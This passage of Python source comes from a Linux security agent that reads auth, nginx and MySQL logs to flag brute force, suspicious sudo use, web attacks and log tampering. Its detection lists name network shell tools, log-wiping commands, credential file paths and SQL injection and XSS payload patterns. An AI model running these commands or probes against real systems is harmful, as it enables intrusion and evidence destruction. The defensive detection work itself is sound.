#!/usr/bin/env python3
"""
AiBoO Linux Sentinel - read-only log agent for Linux servers.

One AiBoO backend and dashboard can now watch Windows AND Linux machines:

  Windows PC  ->  AiBoO-Agent.exe   (reads the Windows Event Log)
  Linux box   ->  this file         (reads auth.log / nginx / mysql / journal)

It is deliberately small and boring:

  * Python 3.8+ standard library only - nothing to pip install
  * runs as a NORMAL user (no root, no sudo)
  * never writes to the watched application or its files
  * only reads log files + a few read-only config files
  * sends findings to the same AiBoO API the Windows agent uses
        POST /api/agent/findings        -> shows up as an alert
        POST /api/agent/gate-decision   -> TriGate verdict (PASS/HOLD/BLOCK)
        POST /api/agent/heartbeat       -> endpoint shows "Online"
  * keeps its own state in ONE file next to itself (byte offsets + counters)

Accepted output is the same on both operating systems, so approvals, playbooks,
response rules, alerts and reports work for Linux exactly like for Windows.

Usage
    python3 aiboo_linux_agent.py                 # normal service run
    python3 aiboo_linux_agent.py --dry-run       # print findings, send nothing
    python3 aiboo_linux_agent.py --once          # read logs once, then exit
    python3 aiboo_linux_agent.py --replay FILE   # replay a log file (demo/test)
    python3 aiboo_linux_agent.py --selftest      # built-in parser checks

Config: config.ini next to this file (see config.ini.example / README.md).
"""

from __future__ import annotations

import configparser
import json
import os
import re
import socket
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from collections import defaultdict, deque
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path

VERSION = "1.1.3"
AGENT_NAME = "AiBoO-Linux-Sentinel"

try:
    from aiboo_linux_response import ResponseEngine
except ImportError:                                  # keep detection-only installs working
    ResponseEngine = None                             # type: ignore[assignment]

DIR = Path(__file__).resolve().parent
DEFAULT_CONFIG = DIR / "config.ini"
EXAMPLE_CONFIG = DIR / "config.ini.example"
STATE_FILE_NAME = "linux-agent-state.json"
QUEUE_FILE_NAME = "linux-agent-queue.jsonl"
RULES_FILE_NAME = "rules.json"


# ---------------------------------------------------------------------------
# Settings
# ---------------------------------------------------------------------------

@dataclass
class Settings:
    remote_url: str = "http://127.0.0.1:4000"
    api_key: str = "dev-key-change-in-production"
    endpoint_name: str = ""
    importance: str = "normal"          # low | normal | high | critical
    auth_log: str = "/var/log/auth.log"
    nginx_access_log: str = "/var/log/nginx/access.log"
    nginx_error_log: str = "/var/log/nginx/error.log"
    mysql_error_log: str = "/var/log/mysql/error.log"
    extra_logs: str = ""                # "name=path,name=path"
    app_services: str = ""              # systemd units, e.g. "maincar,sidecar"
    blocklist_file: str = ""            # one bad IP / CIDR per line
    poll_seconds: int = 5
    heartbeat_seconds: int = 60
    importance_refresh_seconds: int = 120
    ssh_fail_threshold: int = 5
    ssh_fail_window: int = 300
    web_fail_threshold: int = 10
    web_fail_window: int = 300
    scan_404_threshold: int = 20
    scan_404_window: int = 60
    error_burst_threshold: int = 50
    error_burst_window: int = 60
    verify_tls: bool = True
    dry_run: bool = False
    log_level: str = "INFO"
    # ---- local response (changes the server - OFF by default) -------------
    allow_response: bool = False          # yes = the dashboard may change this server
    response_dry_run: bool = False        # yes = print/record what WOULD happen
    allow_full_isolation: bool = False    # yes = allow cutting the host off the network
    quarantine_dir: str = ""              # default: <agent dir>/quarantine
    watch_dirs: str = ""                  # folders whose new files are watched (quarantine limit too)
    audit_log: str = "/var/log/audit/audit.log"
    proc_scan_seconds: int = 15
    integrity_seconds: int = 300
    # ---- EDR-ish behaviour ------------------------------------------------
    edr_kill_on_sight: bool = False       # yes = kill a reverse shell/C2 process immediately
    edr_quarantine_on_sight: bool = False # yes = move a dropped web shell to quarantine immediately"


def _bool(value, default=False):
    txt = str(value).strip().lower()
    if txt in ("1", "true", "yes", "on"):
        return True
    if txt in ("0", "false", "no", "off"):
        return False
    return default


def _int(value, default):
    try:
        return int(str(value).strip())
    except (TypeError, ValueError):
        return default


def load_settings(path: Path, overrides: dict | None = None) -> Settings:
    """config.ini [AIBOO] section - same style as the Windows agent."""
    cfg = configparser.ConfigParser()
    if path.exists():
        cfg.read(path)
    if not cfg.has_section("AIBOO"):
        cfg["AIBOO"] = {}
    sec = cfg["AIBOO"]

    def get(key, default=""):
        return sec.get(key, fallback=default)

    s = Settings(
        remote_url=(get("remote_url") or "http://127.0.0.1:4000").strip().rstrip("/"),
        api_key=get("api_key", "dev-key-change-in-production").strip(),
        endpoint_name=(get("endpoint_name") or socket.gethostname()).strip(),
        importance=get("importance", "normal").strip().lower(),
        auth_log=get("auth_log", "/var/log/auth.log").strip(),
        nginx_access_log=get("nginx_access_log", "/var/log/nginx/access.log").strip(),
        nginx_error_log=get("nginx_error_log", "/var/log/nginx/error.log").strip(),
        mysql_error_log=get("mysql_error_log", "/var/log/mysql/error.log").strip(),
        extra_logs=get("extra_logs", "").strip(),
        app_services=get("app_services", "").strip(),
        blocklist_file=get("blocklist_file", "").strip(),
        poll_seconds=_int(get("poll_seconds", 5), 5),
        heartbeat_seconds=_int(get("heartbeat_seconds", 60), 60),
        importance_refresh_seconds=_int(get("importance_refresh_seconds", 120), 120),
        ssh_fail_threshold=_int(get("ssh_fail_threshold", 5), 5),
        ssh_fail_window=_int(get("ssh_fail_window", 300), 300),
        web_fail_threshold=_int(get("web_fail_threshold", 10), 10),
        web_fail_window=_int(get("web_fail_window", 300), 300),
        scan_404_threshold=_int(get("scan_404_threshold", 20), 20),
        scan_404_window=_int(get("scan_404_window", 60), 60),
        error_burst_threshold=_int(get("error_burst_threshold", 50), 50),
        error_burst_window=_int(get("error_burst_window", 60), 60),
        verify_tls=_bool(get("verify_tls", "yes"), True),
        dry_run=_bool(get("dry_run", "no"), False),
        log_level=get("log_level", "INFO").strip().upper(),
        allow_response=_bool(get("allow_response", "no"), False),
        response_dry_run=_bool(get("response_dry_run", "yes"), True),
        allow_full_isolation=_bool(get("allow_full_isolation", "no"), False),
        quarantine_dir=get("quarantine_dir", "").strip(),
        watch_dirs=get("watch_dirs", "").strip(),
        audit_log=get("audit_log", "/var/log/audit/audit.log").strip(),
        proc_scan_seconds=_int(get("proc_scan_seconds", 15), 15),
        integrity_seconds=_int(get("integrity_seconds", 300), 300),
        edr_kill_on_sight=_bool(get("edr_kill_on_sight", "no"), False),
        edr_quarantine_on_sight=_bool(get("edr_quarantine_on_sight", "no"), False),
    )
    for key, value in (overrides or {}).items():
        if value not in (None, ""):
            setattr(s, key, value)
    return s


def load_rules() -> dict:
    """Optional rules.json - thresholds / extra patterns, all optional."""
    path = DIR / RULES_FILE_NAME
    if not path.exists():
        return {}
    try:
        return json.loads(path.read_text(encoding="utf-8"))
    except Exception as exc:                     # never stop the agent for this
        log(f"rules.json could not be read ({exc}) - using built-in rules")
        return {}


def log(msg: str, level: str = "INFO") -> None:
    stamp = datetime.now().strftime("%H:%M:%S")
    print(f"{stamp} [{level}] {AGENT_NAME} - {msg}", flush=True)


# ---------------------------------------------------------------------------
# Patterns - what a Linux attack looks like
# Every pattern name matches the Windows agent's TriGate vocabulary, so the
# dashboard, approvals, playbooks and reports treat both OSes the same way.
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class Pattern:
    key: str
    label: str
    intent: int                      # TriGate Gate 2 starting point (0-100)
    threat_type: str                 # one of the AiBoO threat types
    mitre: str = ""
    mitre_name: str = ""


PATTERNS: dict[str, Pattern] = {p.key: p for p in [
    # --- identity / access ---
    Pattern("brute_force", "Password guessing (many failed logons)", 70, "identity_mismatch", "T1110", "Brute Force"),
    Pattern("failed_logon", "Failed logon", 30, "identity_mismatch", "T1110", "Brute Force"),
    Pattern("logon_success", "Successful logon", 10, "identity_mismatch", "T1078", "Valid Accounts"),
    Pattern("login_after_brute_force", "Successful logon right after password guessing", 90, "identity_mismatch", "T1078", "Valid Accounts"),
    Pattern("account_created", "New user account created", 50, "insider_threat"),
    Pattern("account_deleted", "User account deleted", 40, "insider_threat"),
    Pattern("admin_group_add", "User added to an admin group", 75, "insider_threat"),
    Pattern("privilege_use", "Sensitive privilege used", 30, "identity_mismatch", "T1548", "Abuse Elevation Control"),
    Pattern("suspicious_sudo", "Dangerous command run with sudo", 75, "insider_threat", "T1548.003", "Sudo and Sudo Caching"),
    Pattern("ssh_key_installed", "SSH key added to an account (backdoor)", 80, "insider_threat", "T1098.004", "SSH Authorized Keys"),
    # --- persistence ---
    Pattern("scheduled_task", "Cron job created or changed", 65, "anomalous_behavior", "T1053.003", "Cron"),
    Pattern("service_installed", "Systemd service started/enabled", 55, "anomalous_behavior", "T1543.002", "Systemd Service"),
    Pattern("webshell_upload", "Possible web shell upload", 85, "malware", "T1505.003", "Web Shell"),
    # --- web attacks (nginx / FastAPI) ---
    Pattern("sql_injection", "SQL injection attempt", 85, "network_intrusion", "T1190", "Exploit Public-Facing Application"),
    Pattern("xss_attempt", "Cross-site scripting attempt", 70, "network_intrusion", "T1059.007", "JavaScript"),
    Pattern("path_traversal", "Directory traversal attempt", 80, "network_intrusion", "T1083", "File and Directory Discovery"),
    Pattern("sensitive_file_probe", "Probe for a sensitive file (.env, .git, backups)", 80, "network_intrusion", "T1552.001", "Credentials In Files"),
    Pattern("sensitive_file_hit", "Sensitive file was served (HTTP 200)", 95, "network_intrusion", "T1552.001", "Credentials In Files"),
    Pattern("scanner_activity", "Vulnerability scanner / attack tool detected", 65, "network_intrusion", "T1595", "Active Scanning"),
    Pattern("directory_scan", "Directory / endpoint scanning (404 flood)", 60, "network_intrusion", "T1595.002", "Vulnerability Scanning"),
    Pattern("error_burst", "Flood of requests to one endpoint", 55, "network_intrusion", "T1498", "Network Denial of Service"),
    Pattern("network_intrusion", "Network intrusion / port probe", 55, "network_intrusion", "T1046", "Network Service Discovery"),
    # --- hiding tracks ---
    Pattern("log_cleared", "Log file was truncated or removed", 90, "anomalous_behavior", "T1070.002", "Clear Linux or Mac System Logs"),
    Pattern("audit_policy_changed", "Auditing / logging was turned off", 75, "anomalous_behavior", "T1562.006", "Indicator Blocking"),
    # --- threat intelligence + posture ---
    Pattern("threat_intel_alert", "Connection/attempt from a known-bad IP", 65, "threat_intel_alert"),
    Pattern("reverse_shell", "Reverse shell / C2 connection", 95, "malware", "T1059", "Command and Scripting Interpreter"),
    Pattern("dropped_file", "Suspicious file dropped on the server", 80, "malware", "T1105", "Ingress Tool Transfer"),
    Pattern("suid_binary", "New set-uid binary (privilege escalation)", 85, "insider_threat", "T1548.001", "Setuid and Setgid"),
    Pattern("kernel_exploit_attempt", "Exploit / injection attempt seen by the kernel", 90, "memory_threat", "T1055", "Process Injection"),
    Pattern("process_injection", "Process injection attempt (ptrace)", 90, "memory_threat", "T1055", "Process Injection"),
    Pattern("config_weakness", "Weak security setting found on this server", 45, "device_health_fail"),
    Pattern("device_health_fail", "Server health check failed", 40, "device_health_fail"),
]}

# Commands that make a sudo line interesting (T1548). Single words are matched as
# WHOLE tokens - plain substrings made "umount" match "mount " and "chpasswd" match
# "passwd", which is how a normal kernel update filled the dashboard with alerts.
SUSPICIOUS_SUDO_WORDS = (
    "su", "sudo", "bash", "sh", "dash", "zsh", "ksh", "useradd", "usermod", "userdel",
    "passwd", "chpasswd", "visudo", "chattr", "chmod", "crontab", "nc", "netcat",
    "ncat", "socat", "curl", "wget", "python", "python3", "perl", "ruby", "base64",
    "iptables", "ip6tables", "ufw", "nft", "mount", "insmod", "modprobe", "systemctl",
    "service", "docker", "kubectl", "ssh", "scp", "rsync", "at", "batch",
)
SUSPICIOUS_SUDO_PHRASES = (
    "/etc/sudoers", "chmod 777", "/etc/passwd", "/etc/shadow", "systemctl start",
    "systemctl enable", "systemctl stop", "systemctl disable", "journalctl --vacuum",
    "rm -rf /var/log", "truncate -s 0", "dd if=", "openssl s_client", "> /var/log",
    "history -c", "> ~/.bash_history",
)
_SUDO_WORD_RES = [re.compile(r"(?:^|[\s/])" + re.escape(w) + r"(?![a-z])", re.I)
                  for w in SUSPICIOUS_SUDO_WORDS]


# sudo apt/dpkg/snap/pip work is routine maintenance, not attacker behaviour
SUDO_PACKAGE_TOOLS = (
    "apt", "apt-get", "aptitude", "dpkg", "dpkg-deb", "snap", "pip", "pip3", "yum",
    "dnf", "zypper", "rpm", "unattended-upgrade", "needrestart", "debconf",
    "add-apt-repository", "apt-key", "update-alternatives", "ucf",
)


def find_suspicious_sudo(cmd: str) -> str:
    """Which suspicious command/word appears in this sudo command line?"""
    low = (cmd or "").lower()
    first = os.path.basename((cmd or "").split()[0]).lower() if (cmd or "").split() else ""
    if first in SUDO_PACKAGE_TOOLS:
        return ""                       # apt-get install curl is not an attack
    for phrase in SUSPICIOUS_SUDO_PHRASES:
        if phrase.lower() in low:
            return phrase
    for word, rx in zip(SUSPICIOUS_SUDO_WORDS, _SUDO_WORD_RES):
        if rx.search(cmd or ""):
            return word
    return ""

# User agents of scanners / attack tools
SCANNER_AGENTS = (
    "sqlmap", "nikto", "nmap", "masscan", "acunetix", "nessus", "wpscan", "dirbuster",
    "gobuster", "nuclei", "hydra", "zgrab", "feroxbuster", "w3af", "skipfish", "whatweb",
    "openvas", "zap", "burpsuite", "burp", "metasploit", "havij", "xray", "commix",
)

# Paths that should never be reachable from the internet
SENSITIVE_PATHS = (
    "/.env", "/.git", "/.svn", "/.aws/credentials", "/.ssh/id_rsa", "/id_rsa",
    "/wp-admin", "/wp-login", "/phpmyadmin", "/pma/", "/adminer", "/.htpasswd",
    "/backup", "/dump.sql", "/.sql", "/database.sql", "/db_backup", "/config.php",
    "/server-status", "/actuator/env", "/actuator/heapdump", "/console", "/jmx-console",
    "/manager/html", "/.DS_Store", "/web.config", "/appsettings.json", "/swagger",
    "/openapi.json", "/docs", "/phpinfo", "/xmlrpc.php", "/shell", "/c99.php",
)
SENSITIVE_PATHS_CRITICAL = ("/.env", "/.git", "/.aws/credentials", "/.ssh/id_rsa",
                            "/id_rsa", "/.htpasswd", "/db_backup", "/dump.sql",
                            "/database.sql", "/.sql", "/web.config", "/appsettings.json")

SQLI_RE = re.compile(
    r"(union[\s/*]+select|select[\s/*]+.{0,40}from\s|'\s*or\s*'?1'?\s*=\s*'?1|"
    r"\bor\s+1\s*=\s*1|sleep\(\s*\d+\s*\)|benchmark\(|information_schema|load_file\(|"
    r"into\s+outfile|xp_cmdshell|updatexml\(|extractvalue\(|waitfor\s+delay)", re.I)
XSS_RE = re.compile(r"(<script|%3cscript|onerror\s*=|onload\s*=|javascript:|alert\(\s*[0-9\"']|"
                    r"document\.cookie|%3c%2fscript)", re.I)
TRAVERSAL_RE = re.compile(r"(\.\./|%2e%2e%2f|%2e%2e/|\.\.%2f|/etc/passwd|/proc/self/environ|"
                          r"c:\\windows\\win\.ini)", re.I)
SHELL_UPLOAD_RE = re.compile(r"\.(php|phtml|php7|jsp|jspx|asp|aspx|cgi|pl|sh)(\?|$)", re.I)

# auth.log / sshd
RE_SSH_FAIL = re.compile(r"Failed password for (?:invalid user )?(?P<user>\S+) from (?P<ip>[0-9a-fA-F:.]+)")
RE_SSH_INVALID = re.compile(r"Invalid user (?P<user>\S+) from (?P<ip>[0-9a-fA-F:.]+)")
RE_SSH_OK = re.compile(r"Accepted (?:password|publickey) for (?P<user>\S+) from (?P<ip>[0-9a-fA-F:.]+)")
RE_SSH_PREAUTH = re.compile(r"Connection closed by (?:authenticating user )?(?P<user>\S+) (?P<ip>[0-9a-fA-F:.]+) port")
RE_SSH_MAXTRY = re.compile(r"maximum authentication attempts exceeded for (?:invalid user )?(?P<user>\S+) from (?P<ip>[0-9a-fA-F:.]+)")
RE_SSH_NOIDENT = re.compile(r"Did not receive identification string from (?P<ip>[0-9a-fA-F:.]+)")
RE_SSH_BREAKIN = re.compile(r"POSSIBLE BREAK-IN ATTEMPT")
RE_SUDO = re.compile(r"sudo:\s+(?P<user>\S+)\s*:.*?COMMAND=(?P<cmd>.*)$")
RE_SUDO_FAIL = re.compile(r"sudo:\s+(?P<user>\S+)\s*:.*?incorrect password attempt")
RE_USERADD = re.compile(r"useradd\[[0-9]+\]:\s+new user:\s+name=(?P<user>\S+)")
RE_USERDEL = re.compile(r"userdel\[[0-9]+\]:\s+delete user '(?P<user>[^']+)'")
RE_GROUPADD_USER = re.compile(r"add '(?P<user>[^']+)' to group '(?P<group>[^']+)'")
RE_GROUPADD = re.compile(r"(?:usermod|gpasswd|adduser)[^:]*:\s.*?(?:add|added)[^:]*?(?:to|into)\s+group\s+'?(?P<group>sudo|wheel|admin|adm|root)'?", re.I)
RE_CRON = re.compile(r"crontab\[[0-9]+\]:\s+\((?P<user>[^)]+)\)\s+(?:REPLACE|BEGIN EDIT|LIST|DELETE)")
RE_AUTHKEY = re.compile(r"(?:authorized_keys|\.ssh/authorized_keys)", re.I)
RE_LOG_TRUNCATE = re.compile(r"(truncate|rm -f|shred).{0,40}(auth\.log|syslog|messages|\.log)", re.I)
RE_AUDIT_OFF = re.compile(r"(auditctl\s+-e\s+0|systemctl\s+(stop|disable)\s+(auditd|rsyslog|systemd-journald))", re.I)

# nginx access log (combined format)
RE_ACCESS = re.compile(
    r"^(?P<ip>\S+) \S+ \S+ \[(?P<time>[^\]]+)\] \"(?P<method>[A-Z]+) (?P<path>[^\"]*?) "
    r"(?P<proto>[^\"]*)\" (?P<status>\d{3}) (?P<size>\S+)(?: \"(?P<ref>[^\"]*)\" \"(?P<ua>[^\"]*)\")?")

# mysql error log
RE_MYSQL_DENIED = re.compile(r"Access denied for user '(?P<user>[^']+)'@'(?P<ip>[^']+)'")


# ---------------------------------------------------------------------------
# State: sliding-window counters (who failed how often, from where)
# ---------------------------------------------------------------------------

class Counters:
    """Counts events per key inside a time window (in memory + saveable)."""

    def __init__(self, now: float | None = None) -> None:
        self._data: dict[str, deque] = defaultdict(deque)
        self.now = now or time.time()

    def bump(self, key: str, window: int, weight: int = 1) -> int:
        q = self._data[key]
        for _ in range(weight):
            q.append(self.now)
        cutoff = self.now - window
        while q and q[0] < cutoff:
            q.popleft()
        return len(q)

    def count(self, key: str, window: int) -> int:
        q = self._data.get(key)
        if not q:
            return 0
        cutoff = self.now - window
        while q and q[0] < cutoff:
            q.popleft()
        return len(q)

    def prune(self, keep: int = 24 * 3600) -> None:
        cutoff = self.now - keep
        for key in list(self._data):
            q = self._data[key]
            while q and q[0] < cutoff:
                q.popleft()
            if not q:
                self._data.pop(key, None)

    def to_json(self) -> dict:
        return {k: list(v) for k, v in self._data.items() if v}

    def load_json(self, blob: dict) -> None:
        for key, values in (blob or {}).items():
            try:
                self._data[key] = deque(float(x) for x in values)
            except (TypeError, ValueError):
                continue


class AgentState:
    """Byte offsets + counters, kept in ONE json file next to the agent."""

    def __init__(self, path: Path) -> None:
        self.path = path
        self.offsets: dict[str, int] = {}
        self.counters = Counters()
        self.seen: deque = deque(maxlen=4000)      # dedup of what we already sent
        self.suid_baseline: set[str] = set()       # set-uid binaries that are normal here
        self.load()

    def load(self) -> None:
        if not self.path.exists():
            return
        try:
            blob = json.loads(self.path.read_text(encoding="utf-8"))
        except Exception as exc:
            log(f"state file unreadable ({exc}) - starting fresh")
            return
        self.offsets = {str(k): int(v) for k, v in (blob.get("offsets") or {}).items()}
        self.counters.load_json(blob.get("counters") or {})
        self.seen = deque((blob.get("seen") or [])[-4000:], maxlen=4000)
        self.suid_baseline = {str(p) for p in (blob.get("suid_baseline") or []) if p}

    def save(self) -> None:
        self.counters.now = time.time()
        self.counters.prune()
        blob = {
            "version": VERSION,
            "saved_at": datetime.now(timezone.utc).isoformat(),
            "offsets": self.offsets,
            "counters": self.counters.to_json(),
            "seen": list(self.seen),
            "suid_baseline": sorted(self.suid_baseline)[:2000],
        }
        tmp = self.path.with_suffix(".tmp")
        try:
            tmp.write_text(json.dumps(blob), encoding="utf-8")
            os.replace(tmp, self.path)
        except OSError as exc:
            log(f"could not save state: {exc}", "WARN")

    def already_sent(self, key: str) -> bool:
        return key in self.seen

    def remember(self, key: str) -> None:
        self.seen.append(key)

    def reset_offsets(self) -> None:
        self.offsets = {}
        self.save()


# ---------------------------------------------------------------------------
# Findings
# ---------------------------------------------------------------------------

@dataclass
class Finding:
    pattern: str
    severity: str                 # low | medium | high | critical
    summary: str
    src_ip: str = ""
    subject: str = ""
    entity: str = ""
    confidence: float = 0.6
    source_file: str = ""
    raw: str = ""
    description: str = ""
    dedup_key: str = ""
    extra: dict = field(default_factory=dict)

    def to_api(self, endpoint: str, hostname: str, platform: str) -> dict:
        pat = PATTERNS.get(self.pattern) or PATTERNS["network_intrusion"]
        return {
            "id": self.dedup_key or f"linux_{int(time.time()*1000)}",
            "agent_name": AGENT_NAME,
            "threat_type": pat.threat_type,
            "severity": self.severity,
            "confidence": round(float(self.confidence), 2),
            "summary": self.summary,
            "actions": ["log", "alert_dashboard"],
            "platform": platform,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "metadata": {
                "platform": platform,
                "os": platform,
                "host": hostname,
                "endpoint": endpoint,
                "pattern": self.pattern,
                "pattern_label": pat.label,
                "mitre": f"{pat.mitre} {pat.mitre_name}".strip(),
                "src_ip": self.src_ip,
                "subject": self.subject,
                "entity": self.entity or self.subject or self.src_ip,
                "log_file": self.source_file,
                "description": self.description or self.summary,
                "raw": self.raw[:400],
                "collector": f"{AGENT_NAME} {VERSION}",
                "test_event": False,
                **self.extra,
            },
        }


RISK_WEIGHTS = {"trust": 0.30, "intent": 0.40, "impact": 0.30}
IMPACT_POINTS = {"low": 10, "normal": 35, "high": 60, "critical": 80}
SEVERITY_BY_RISK = ((75, "critical"), (55, "high"), (35, "medium"), (0, "low"))


def severity_for_risk(risk: int) -> str:
    for limit, name in SEVERITY_BY_RISK:
        if risk >= limit:
            return name
    return "low"


def verdict_for_risk(risk: int) -> str:
    if risk >= 55:
        return "block"
    if risk >= 35:
        return "hold"
    return "pass"


def trust_score() -> tuple[int, list[dict]]:
    """
    Gate 1 (device trust) with the few checks that need no root at all.
    Files are only READ; nothing is changed.
    """
    score, factors = 70, []

    def factor(points: int, text: str) -> None:
        factors.append({"points": points, "text": text})

    sshd = Path("/etc/ssh/sshd_config")
    if sshd.exists():
        try:
            txt = sshd.read_text(errors="replace")
            if re.search(r"^\s*PermitRootLogin\s+yes", txt, re.M | re.I):
                score -= 10
                factor(-10, "Server: SSH root login is allowed (PermitRootLogin yes)")
            if re.search(r"^\s*PasswordAuthentication\s+yes", txt, re.M | re.I):
                score -= 5
                factor(-5, "Server: SSH accepts passwords (brute-force possible)")
            if re.search(r"^\s*PubkeyAuthentication\s+no", txt, re.M | re.I):
                score -= 5
                factor(-5, "Server: SSH public-key login is disabled")
        except OSError:
            pass
    if Path("/etc/fail2ban").exists() or Path("/usr/bin/fail2ban-client").exists():
        score += 5
        factor(5, "Server: fail2ban is installed (brute-force protection)")
    else:
        score -= 5
        factor(-5, "Server: no fail2ban - nothing slows down password guessing")

    score = max(0, min(100, score))
    return score, factors


# ---------------------------------------------------------------------------
# Detectors - auth.log / sshd / sudo / accounts
# ---------------------------------------------------------------------------

def detect_auth_line(line: str, st: Settings, state: AgentState, fname: str) -> list[Finding]:
    out: list[Finding] = []
    now = state.counters.now

    # ---- failed logons: counted, alert only on a burst --------------------
    m_fail = RE_SSH_FAIL.search(line) or RE_SSH_INVALID.search(line)
    m_max = RE_SSH_MAXTRY.search(line)
    m_sudofail = RE_SUDO_FAIL.search(line)
    if m_fail or m_max or m_sudofail:
        if m_fail:
            ip, user = m_fail.group("ip"), m_fail.group("user")
        elif m_max:
            ip, user = m_max.group("ip"), m_max.group("user")
        else:
            user, ip = m_sudofail.group("user"), ""
        n_ip = state.counters.bump(f"ssh_fail_ip:{ip}", st.ssh_fail_window) if ip else 0
        n_user = state.counters.bump(f"ssh_fail_user:{user}", st.ssh_fail_window) if user else 0
        worst = max(n_ip, n_user)
        if worst >= st.ssh_fail_threshold:
            key = f"brute:{ip or user}:{now // st.ssh_fail_window}"
            out.append(Finding(
                pattern="brute_force",
                severity="high",
                summary=(f"Password guessing: {worst} failed logons in "
                         f"{st.ssh_fail_window // 60} min"
                         + (f" from {ip}" if ip else "")
                         + (f" for user '{user}'" if user else "")),
                src_ip=ip, subject=user, entity=user or ip,
                confidence=min(0.6 + 0.03 * worst, 0.95),
                source_file=fname, raw=line.strip(), dedup_key=key,
                description=(f"{worst} failed SSH/sudo logons inside "
                             f"{st.ssh_fail_window} seconds"
                             + (f" from {ip}" if ip else "")
                             + (f" targeting '{user}'" if user else "")),
                extra={"failed_attempts": worst},
            ))
        return out

    # ---- successful logon, and the nasty case: success after failures -----
    ok = RE_SSH_OK.search(line)
    if ok:
        ip, user = ok.group("ip"), ok.group("user")
        prev = state.counters.count(f"ssh_fail_ip:{ip}", st.ssh_fail_window)
        if prev >= 3:
            key = f"loginafterbrute:{ip}:{user}:{now // 300}"
            out.append(Finding(
                pattern="login_after_brute_force",
                severity="critical",
                summary=(f"BREAK-IN LIKELY: '{user}' logged in from {ip} right after "
                         f"{prev} failed attempts"),
                src_ip=ip, subject=user, entity=user,
                confidence=0.9, source_file=fname, raw=line.strip(), dedup_key=key,
                description=(f"Successful SSH logon for '{user}' from {ip} immediately "
                             f"after {prev} failed attempts - treat the account as compromised."),
                extra={"failed_before_success": prev},
            ))
        else:
            out.append(Finding(
                pattern="logon_success", severity="low",
                summary=f"SSH logon: '{user}' from {ip}",
                src_ip=ip, subject=user, entity=user, confidence=0.4,
                source_file=fname, raw=line.strip(),
                dedup_key=f"logonok:{user}:{ip}:{int(now // 60)}",
            ))
        return out

    # ---- sudo ------------------------------------------------------------
    sud = RE_SUDO.search(line)
    if sud:
        cmd = (sud.group("cmd") or "").strip()
        user = sud.group("user")

        # destroying evidence outranks every other sudo finding (critical)
        if RE_LOG_TRUNCATE.search(cmd):
            return [Finding(
                pattern="log_cleared", severity="critical",
                summary=f"Log file truncated/deleted by '{user}': {cmd[:110]}",
                subject=user, entity=user, confidence=0.9, source_file=fname,
                raw=line.strip(), dedup_key=f"logtrunc:{user}:{int(now // 120)}",
                description=f"'{user}' ran '{cmd[:200]}' - the audit trail was destroyed.",
                extra={"command": cmd[:200]},
            )]
        if RE_AUDIT_OFF.search(cmd):
            return [Finding(
                pattern="audit_policy_changed", severity="high",
                summary=f"Auditing/logging disabled by '{user}': {cmd[:110]}",
                subject=user, entity=user, confidence=0.9, source_file=fname,
                raw=line.strip(), dedup_key=f"auditoff:{user}:{int(now // 300)}",
                description=f"'{user}' ran '{cmd[:200]}' - security logging is now off.",
                extra={"command": cmd[:200]},
            )]
        if state_ran_recently(state, cmd):
            return out                      # this was AiBoO's own response action
        hit = find_suspicious_sudo(cmd)
        if hit:
            out.append(Finding(
                pattern="suspicious_sudo", severity="high",
                summary=f"Dangerous command as root by '{user}': {cmd[:120]}",
                subject=user, entity=user, confidence=0.75,
                source_file=fname, raw=line.strip(),
                dedup_key=f"sudo:{user}:{hash(cmd) & 0xffff}:{int(now // 300)}",
                description=f"'{user}' ran '{cmd[:200]}' with sudo/root rights.",
                extra={"command": cmd[:200]},
            ))
        return out

    # ---- accounts and groups --------------------------------------------
    m = RE_USERADD.search(line)
    if m:
        user = m.group("user").strip(" ,;")
        out.append(Finding(
            pattern="account_created", severity="high",
            summary=f"New Linux user account created: '{user}'",
            subject=user, entity=user, confidence=0.8, source_file=fname, raw=line.strip(),
            dedup_key=f"useradd:{user}:{int(now // 60)}",
            description=f"useradd created the account '{user}'.",
        ))
        return out
    m = RE_USERDEL.search(line)
    if m:
        user = m.group("user")
        out.append(Finding(
            pattern="account_deleted", severity="high",
            summary=f"Linux user account deleted: '{user}'",
            subject=user, entity=user, confidence=0.8, source_file=fname, raw=line.strip(),
            dedup_key=f"userdel:{user}:{int(now // 60)}",
        ))
        return out
    m = RE_GROUPADD.search(line)
    if m:
        group = m.group("group")
        detail = RE_GROUPADD_USER.search(line)
        user = detail.group("user") if detail else ""
        out.append(Finding(
            pattern="admin_group_add", severity="high",
            summary=f"Account added to the privileged group '{group}'",
            subject=user or group, entity=user or group, confidence=0.8,
            source_file=fname, raw=line.strip(),
            dedup_key=f"groupadd:{group}:{user}:{int(now // 60)}",
            extra={"privileged_group": group},
        ))
        return out

    # ---- cron / persistence ---------------------------------------------
    m = RE_CRON.search(line)
    if m:
        user = m.group("user")
        out.append(Finding(
            pattern="scheduled_task", severity="high",
            summary=f"Cron jobs changed by '{user}' (persistence)",
            subject=user, entity=user, confidence=0.75, source_file=fname, raw=line.strip(),
            dedup_key=f"cron:{user}:{int(now // 120)}",
        ))
        return out

    # ---- SSH backdoor: authorized_keys touched ---------------------------
    if RE_AUTHKEY.search(line) and ("sudo" in line or "useradd" in line or "usermod" in line):
        out.append(Finding(
            pattern="ssh_key_installed", severity="high",
            summary="SSH authorized_keys modified (possible backdoor key)",
            confidence=0.7, source_file=fname, raw=line.strip(),
            dedup_key=f"authkeys:{int(now // 120)}",
        ))
        return out

    # ---- hiding tracks ---------------------------------------------------
    if RE_LOG_TRUNCATE.search(line):
        out.append(Finding(
            pattern="log_cleared", severity="critical",
            summary="Log file was truncated or deleted (covering tracks)",
            confidence=0.85, source_file=fname, raw=line.strip(),
            dedup_key=f"logtrunc:{int(now // 120)}",
        ))
        return out
    if RE_AUDIT_OFF.search(line):
        out.append(Finding(
            pattern="audit_policy_changed", severity="high",
            summary="Auditing / logging was turned off",
            confidence=0.85, source_file=fname, raw=line.strip(),
            dedup_key=f"auditoff:{int(now // 300)}",
        ))
        return out

    # ---- scanning / intrusion attempts ----------------------------------
    if RE_SSH_BREAKIN.search(line):
        out.append(Finding(
            pattern="network_intrusion", severity="high",
            summary="SSH reports POSSIBLE BREAK-IN ATTEMPT",
            confidence=0.8, source_file=fname, raw=line.strip(),
            dedup_key=f"breakin:{int(now // 60)}",
        ))
        return out
    m = RE_SSH_NOIDENT.search(line)
    if m:
        ip = m.group("ip")
        n = state.counters.bump(f"noident:{ip}", 120)
        if n >= 3:
            out.append(Finding(
